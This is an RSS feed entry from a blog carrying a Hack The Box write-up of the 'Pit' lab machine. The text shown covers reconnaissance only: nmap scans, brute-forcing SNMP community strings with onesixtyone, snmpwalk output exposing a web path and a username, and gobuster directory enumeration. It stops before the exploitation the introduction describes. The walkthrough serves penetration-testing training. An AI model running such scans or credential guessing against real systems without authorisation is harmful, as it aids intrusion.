<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>CTF on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/categories/ctf/</link>
    <description>Recent content in CTF on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 13 Oct 2021 16:54:04 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/categories/ctf/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Pit</title>
      <link>https://fahmifj.github.io/hackthebox/pit/</link>
      <pubDate>Wed, 13 Oct 2021 16:54:04 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/pit/</guid>
      <description>As a medium difficulty box, Pit from Hack The Box has a well-designed enumeration flow.</description>
      <content:encoded><![CDATA[<p>As a medium difficulty box, Pit from Hack The Box has a well-designed enumeration flow. It starts by enumerating SNMP to reveal a username and a hidden web path to a CMS called SeedDMS, where I can login with that username. The CMS is vulnerable to a remote code execution, allowing me to obtain a database password that I can then use on a <a href="https://cockpit-project.org/">Cockpit</a> instance. Enumerating the system from Cockpit&rsquo;s terminal reveals that each time a &ldquo;walk&rdquo; is performed, SNMP will execute a script. This script basically searches for and executes other scripts in a specific directory to which I have write access, allowing me to create a malicious script in there to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>SNMP enumeration and exploitation</li>
<li>SeedDMS exploitation</li>
<li>Cockpit exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>snmpwalk</li>
<li>gobuster</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<h4 id="tcp">TCP</h4>
<p>For TCP ports, <code>nmap</code> discovers 3 open ports: SSH on port 22, an NGINX web server on port 80, and a service that <code>nmap</code> identifies it as zeus-admin.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-pit 10.10.10.241
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-20 11:03 EDT
Nmap scan report <span class="k">for</span> 10.10.10.241
Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.079s latency<span class="o">)</span>.
Not shown: <span class="m">65532</span> filtered ports
Reason: <span class="m">65332</span> no-responses and <span class="m">200</span> admin-prohibiteds
PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl <span class="m">63</span> OpenSSH 8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
80/tcp   open  http            syn-ack ttl <span class="m">63</span> nginx 1.14.1
9090/tcp open  ssl/zeus-admin? syn-ack ttl <span class="m">63</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 401.69 seconds
→ root@kali «pit» «10.10.14.49» 
$ nmap -p22,80,9090 --max-rate <span class="m">1000</span> -sC -oA nmap/10-tcp-defaultsc-pit 10.10.10.241
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-20 11:12 EDT
Nmap scan report <span class="k">for</span> 10.10.10.241
Host is up <span class="o">(</span>0.16s latency<span class="o">)</span>.

PORT     STATE SERVICE
22/tcp   open  ssh
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">3072</span> 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http
<span class="p">|</span>_http-title: Test Page <span class="k">for</span> the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  zeus-admin
<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dms-pit.htb/organizationName<span class="o">=</span>4cd9329523184b0ea52ba0d20a1a6f92/countryName<span class="o">=</span>US
<span class="p">|</span> Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
<span class="p">|</span> Not valid before: 2020-04-16T23:29:12
<span class="p">|</span>_Not valid after:  2030-06-04T16:09:12
<span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 4.39 seconds
</code></pre></div><p>Also, <code>nmap</code> revealed a domain name <code>dms-pit.htb</code> from the SSL certificate on port 9090. I will add it to my <code>/etc/hosts</code> file</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.241 dms-pit.htb pit.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><h4 id="udp">UDP</h4>
<p>For UDP ports, <code>nmap</code> discovers an SNMP server on port 161 and reveals a domain name <code>pit.htb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
$ nmap -sU -sV -n --top-ports <span class="m">20</span> -oA nmap/10-udp-top20-pit 10.10.10.241
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-20 11:18 EDT
Nmap scan report <span class="k">for</span> 10.10.10.241
Host is up <span class="o">(</span>0.074s latency<span class="o">)</span>.

PORT      STATE         SERVICE      VERSION
53/udp    open<span class="p">|</span>filtered domain
67/udp    open<span class="p">|</span>filtered dhcps
68/udp    filtered      dhcpc
69/udp    open<span class="p">|</span>filtered tftp
123/udp   open<span class="p">|</span>filtered ntp
135/udp   open<span class="p">|</span>filtered msrpc
137/udp   open<span class="p">|</span>filtered netbios-ns
138/udp   filtered      netbios-dgm
139/udp   open<span class="p">|</span>filtered netbios-ssn
161/udp   open          snmp         SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
162/udp   open<span class="p">|</span>filtered snmptrap
445/udp   filtered      microsoft-ds
500/udp   open<span class="p">|</span>filtered isakmp
514/udp   filtered      syslog
520/udp   open<span class="p">|</span>filtered route
631/udp   open<span class="p">|</span>filtered ipp
1434/udp  open<span class="p">|</span>filtered ms-sql-m
1900/udp  filtered      upnp
4500/udp  open<span class="p">|</span>filtered nat-t-ike
49152/udp open<span class="p">|</span>filtered unknown
Service Info: Host: pit.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 18.21 seconds
</code></pre></div><h3 id="poking-the-websites">Poking the websites</h3>
<p>For HTTP, it seems only <code>dms-pit.htb</code> that serves different content.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
$ curl -s http://10.10.10.241/ <span class="p">|</span> wc -c                                 
<span class="m">4057</span>
→ root@kali «pit» «10.10.14.49» 
$ curl -s http://pit.htb/ <span class="p">|</span> wc -c
<span class="m">4057</span>
→ root@kali «pit» «10.10.14.49» 
$ curl -s http://dms-pit.htb/ <span class="p">|</span> wc -c
<span class="m">169</span>
</code></pre></div><p>For HTTPS on port 9090, it&rsquo;s all the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
$ curl -s -k https://10.10.10.241:9090/ <span class="p">|</span> wc -c
<span class="m">43548</span>
→ root@kali «pit» «10.10.14.49» 
$ curl -s -k https://pit.htb:9090/ <span class="p">|</span> wc -c
<span class="m">43548</span>
→ root@kali «pit» «10.10.14.49» 
$ curl -s -k https://dms-pit.htb:9090/ <span class="p">|</span> wc -c
<span class="m">43548</span>
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>On port 80, a NGINX default web page for REHL is shown here.</p>
<p><div class="img-container"><img src="imgs/image-20210520224354684.png" alt="image-20210520224354684"  /></div>
</p>
<p>Running <code>gobuster</code> against this site doesn&rsquo;t really find something useful, and I couldn&rsquo;t find a critical vulnerability on <code>nginx 1.14.1</code>.</p>
<h3 id="tcp-80---dms-pithtb">TCP 80 - dms-pit.htb</h3>
<p>Heading to <code>dms-pit.htb</code> on port 80 shows a 403 forbidden error message.</p>
<p><div class="img-container"><img src="imgs/image-20210520224457026.png" alt="image-20210520224457026"  /></div>
</p>
<p>For this site, <code>gobuster</code> actually found some files, but all of them returned with 403 status.</p>
<h3 id="tcp-9090---website-https">TCP 9090 - Website (HTTPS)</h3>
<p>On port 9090, there is a login page.</p>
<p><div class="img-container"><img src="imgs/image-20210520225003343.png" alt="image-20210520225003343"  /></div>
</p>
<p>This login page is identified as an instance of <a href="https://cockpit-project.org/.">Cockpit</a>, a web-based interface for system administration.</p>
<h4 id="searchsploit">Searchsploit</h4>
<p>There is a security issue on GitHub which talks about SSRF:</p>
<ul>
<li><a href="https://github.com/cockpit-project/cockpit/issues/15077">https://github.com/cockpit-project/cockpit/issues/15077</a></li>
</ul>
<p>The researcher disclosed the issue in his blog.</p>
<ul>
<li><a href="https://docs.unsafe-inline.com/0day/cokpit-version-234-server-side-request-forgery-cve-2020-35850">https://docs.unsafe-inline.com/0day/cokpit-version-234-server-side-request-forgery-cve-2020-35850</a></li>
</ul>
<p>The researcher also provides a PoC, but it requires an account, so I will move on to the next service.</p>
<h3 id="udp-161---snmp">UDP 161 - SNMP</h3>
<p>From what <code>nmap</code> gave, I assume that this machine supports SNMPv1-SNMPv3. Based on what I read on <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp">HackTricks</a>, to enumerate SNMP version 1, I need to know the community string name, and there are two types of it: <code>public</code> and <code>private</code>.</p>
<p>The <code>public</code> community string normally grants read access, however <code>private</code> may grant you read/write access, even leading to <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce">remote code execution</a>.</p>
<p>For SNMP version 1 and 2c, it is possible to identify a valid community string with dictionary attack (brute) based on the server&rsquo;s response. In Kali, there is a preinstalled tool for this which I will use called <code>onesixtyone</code>. I will run it and save the ouput to a file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt 10.10.10.241 &gt; snmp-enum/brute-community-strings
</code></pre></div><p>The attack reveals that <strong>public</strong> is a valid community string.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ cat snmp-enum/brute-community-strings
Scanning <span class="m">1</span> hosts, <span class="m">3220</span> communities
10.10.10.241 <span class="o">[</span>public<span class="o">]</span> Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 <span class="c1">#1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64</span>
10.10.10.241 <span class="o">[</span>public<span class="o">]</span> Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 <span class="c1">#1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64</span>
</code></pre></div><p>Now to enumerate SNMP, I will use another preinstalled tool called <code>snmpwalk</code>. Using this tool will return a list of <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp#oids">OID (Objects Identifiers)</a> which consists a set of numbers separated by dot, so to translate these numbers into a bit meaningful, I will need <code>snmp-mibs-downloader</code>. I will install that with:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ apt-get install snmp-mibs-downloader
</code></pre></div><p>The general usage for <code>snmpwalk</code> is:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ snmpwalk <span class="o">[</span>OPTIONS<span class="o">]</span> AGENT <span class="o">[</span>OID<span class="o">]</span>
</code></pre></div><p>Actually, I did a lot of enumeration with SNMP, but because OID is a hierarchical structure, I found that it was easier to start from the Internet OID, which is <code>1.3.6.1</code>, so that it would  &ldquo;walk&rdquo; down to any readable OID branch, it is something like <code>1.3.6.1</code> -&gt; <code>1.3.6.1.1</code> (directory OID) -&gt; &hellip; -&gt;  <code>1.3.6.1.4</code> (private OID) -&gt; &hellip; -&gt; <code>1.3.6.1.X.X</code>.</p>
<p>I will run <code>snmpwalk</code> on that and save the output to <code>snmp-internet-1.3.6.1.out</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ snmpwalk -v 2c -c public 10.10.10.241 internet &gt; snmp-internet-1.3.6.1.out
</code></pre></div><ul>
<li><code>-v</code> 2c: SNMP version 2c. SNMP version 1 and 2c sends data in clear-text while version 3 uses auth.</li>
<li><code>-c</code> public: community string</li>
<li><code>internet</code>: auto translated to 1.3.6.1 by <code>snmp-mibs-downloader</code></li>
</ul>
<p>I will filter the output with <code>hrSWRunParameters</code> (Host Resources Software Run Parameters), which might leak some sensitive information from the command line arguments of the current running processes, but it doesn&rsquo;t have any.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ cat snmp-enum/snmp-internet-1.3.6.1.out <span class="p">|</span> grep <span class="s2">&#34;hrSWRunParameters&#34;</span> <span class="p">|</span> grep STRING
HOST-RESOURCES-MIB::hrSWRunParameters.1 <span class="o">=</span> STRING: <span class="s2">&#34;--switched-root --system --deserialize 17&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1000 <span class="o">=</span> STRING: <span class="s2">&#34;--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1001 <span class="o">=</span> STRING: <span class="s2">&#34;--foreground&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1002 <span class="o">=</span> STRING: <span class="s2">&#34;--no-debug&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1004 <span class="o">=</span> STRING: <span class="s2">&#34;-s&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1009 <span class="o">=</span> STRING: <span class="s2">&#34;-i --logger=files&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1011 <span class="o">=</span> STRING: <span class="s2">&#34;-f --fill-watermark=0&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1041 <span class="o">=</span> STRING: <span class="s2">&#34;--domain implicit_files --uid 0 --gid 0 --logger=files&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1051 <span class="o">=</span> STRING: <span class="s2">&#34;--uid 0 --gid 0 --logger=files&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1056 <span class="o">=</span> STRING: <span class="s2">&#34;-s /usr/sbin/firewalld --nofork --nopid&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1090 <span class="o">=</span> STRING: <span class="s2">&#34;--no-daemon&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1101 <span class="o">=</span> STRING: <span class="s2">&#34;-D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1105 <span class="o">=</span> STRING: <span class="s2">&#34;-Es /usr/sbin/tuned -l -P&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1116 <span class="o">=</span> STRING: <span class="s2">&#34;-n&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1193 <span class="o">=</span> STRING: <span class="s2">&#34;-o -p -- \\u --noclear tty1 linux&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1208 <span class="o">=</span> STRING: <span class="s2">&#34;--basedir=/usr&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1479 <span class="o">=</span> STRING: <span class="s2">&#34;-n&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1481 <span class="o">=</span> STRING: <span class="s2">&#34;-LS0-6d -f&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.10212 <span class="o">=</span> STRING: <span class="s2">&#34;-Es /usr/share/setroubleshoot/SetroubleshootFixit.py&#34;</span>
</code></pre></div><p>If I examine the full output carefully, the two most interesting information are:</p>
<ul>
<li>A web path <code>/var/www/html/seeddms51x/seeddms</code>, and</li>
<li>A potential username: <code>michelle</code></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">UCD-SNMP-MIB::dskPath.2 <span class="o">=</span> STRING: /var/www/html/seeddms51x/seeddms
UCD-SNMP-MIB::dskDevice.1 <span class="o">=</span> STRING: /dev/mapper/cl-root
UCD-SNMP-MIB::dskDevice.2 <span class="o">=</span> STRING: /dev/mapper/cl-seeddms
...<span class="o">[</span>SNIP<span class="o">]</span>...
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 <span class="o">=</span> INTEGER: <span class="m">1</span>
NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: /usr/bin/monitor
NET-SNMP-EXTEND-MIB::nsExtendArgs.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: <span class="m">5</span>
NET-SNMP-EXTEND-MIB::nsExtendExecType.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: exec<span class="o">(</span>1<span class="o">)</span>
NET-SNMP-EXTEND-MIB::nsExtendRunType.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: run-on-read<span class="o">(</span>1<span class="o">)</span>
NET-SNMP-EXTEND-MIB::nsExtendStorage.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: permanent<span class="o">(</span>4<span class="o">)</span>
NET-SNMP-EXTEND-MIB::nsExtendStatus.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: active<span class="o">(</span>1<span class="o">)</span>
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: Memory usage
NET-SNMP-EXTEND-MIB::nsExtendOutputFull.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: Memory usage
              total        used        free      shared  buff/cache   available
Mem:          3.8Gi       415Mi       3.0Gi        16Mi       452Mi       3.2Gi
Swap:         1.9Gi          0B       1.9Gi
Database status
OK - Connection to database successful.
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user

                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
System uptime
 14:03:52 up 12:03,  <span class="m">0</span> users,  load average: 0.04, 0.01, 0.00
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: <span class="m">31</span>
NET-SNMP-EXTEND-MIB::nsExtendResult.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: <span class="m">0</span>
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.1 <span class="o">=</span> STRING: Memory usage
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.2 <span class="o">=</span> STRING:               total        used        free      shared  buff/cache   available
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.3 <span class="o">=</span> STRING: Mem:          3.8Gi       415Mi       3.0Gi        16Mi       452Mi       3.2Gi
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.4 <span class="o">=</span> STRING: Swap:         1.9Gi          0B       1.9Gi
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.5 <span class="o">=</span> STRING: Database status
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.6 <span class="o">=</span> STRING: OK - Connection to database successful.
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.7 <span class="o">=</span> STRING: System release info
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.8 <span class="o">=</span> STRING: CentOS Linux release 8.3.2011
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.9 <span class="o">=</span> STRING: SELinux Settings
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.10 <span class="o">=</span> STRING: user
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.11 <span class="o">=</span> STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.12 <span class="o">=</span> STRING:                 Labeling   MLS/       MLS/                          
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.13 <span class="o">=</span> STRING: SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.14 <span class="o">=</span> STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.15 <span class="o">=</span> STRING: guest_u         user       s0         s0                             guest_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.16 <span class="o">=</span> STRING: root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.17 <span class="o">=</span> STRING: staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.18 <span class="o">=</span> STRING: sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.19 <span class="o">=</span> STRING: system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.20 <span class="o">=</span> STRING: unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.21 <span class="o">=</span> STRING: user_u          user       s0         s0                             user_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.22 <span class="o">=</span> STRING: xguest_u        user       s0         s0                             xguest_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.23 <span class="o">=</span> STRING: login
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.24 <span class="o">=</span> STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.25 <span class="o">=</span> STRING: Login Name           SELinux User         MLS/MCS Range        Service
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.26 <span class="o">=</span> STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.27 <span class="o">=</span> STRING: __default__          unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.28 <span class="o">=</span> STRING: michelle             user_u               s0                   *
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.29 <span class="o">=</span> STRING: root                 unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.30 <span class="o">=</span> STRING: System uptime
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.31 <span class="o">=</span> STRING:  14:03:52 up 12:03,  <span class="m">0</span> users,  load average: 0.04, 0.01, 0.00
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.31 <span class="o">=</span> No more variables left in this MIB View <span class="o">(</span>It is past the end of the MIB tree<span class="o">)</span>
</code></pre></div><p>I will also notice that some of the output lines starting with <code>NET-SNMP-EXTEND-MIB</code> are similar to the output from some Linux command utilities such as <code>uptime</code> and <code>free -h</code>.</p>
<h3 id="seeddms-tcp-80">SeedDMS (TCP 80)</h3>
<p>From the enumeration above, a web directory was revealed at <code>/var/www/html/seeddms51x/seeddms</code> by <code>snmpwalk</code>. Since the directory path contains a &ldquo;dms&rdquo; string, I tried to append the path name to <code>http://dms-pit.htb</code>.</p>
<p>And then when I enter <code>http://dms-pit.htb/seeddms51x/seeddms</code>, it redirects me to a login page.</p>
<p><div class="img-container"><img src="imgs/image-20210521014642036.png" alt="image-20210521014642036"  /></div>
</p>
<p>A quick search for &ldquo;SeedDMS&rdquo; on Google pops <a href="https://www.seeddms.org/index.php?id=2">this link</a>. It states that SeedDMS is:</p>
<blockquote>
<p>A free document management system with an easy to use web  based user interface for small and medium sized enterprises. It is based on PHP and MySQL or sqlite3 and runs on Linux, MacOS and Windows. Many  years of development has made it a mature, powerful and enterprise ready platform for sharing and storing documents.</p>
</blockquote>
<h4 id="gobuster">Gobuster</h4>
<p>This time <code>gobuster</code> reveals some accessible items.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ gobuster dir -u http://dms-pit.htb/seeddms51x/seeddms/ -x txt,php -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/dms-pit.htb-seeddms-M-80 -t <span class="m">10</span> -b 403,404 -r
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:                     http://dms-pit.htb/seeddms51x/seeddms/
<span class="o">[</span>+<span class="o">]</span> Method:                  GET
<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   403,404
<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Extensions:              txt,php
<span class="o">[</span>+<span class="o">]</span> Follow Redirect:         <span class="nb">true</span>
<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
<span class="o">===============================================================</span>
2021/05/20 15:13:54 Starting gobuster in directory enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7359<span class="o">]</span>
/CHANGELOG            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 101652<span class="o">]</span>
/LICENSE              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 18321<span class="o">]</span>
/TODO                 <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2844<span class="o">]</span>
/Guests.php           <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
/GuideImages.php      <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
/HB.php               <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
/HDRS.php             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
<span class="o">===============================================================</span>
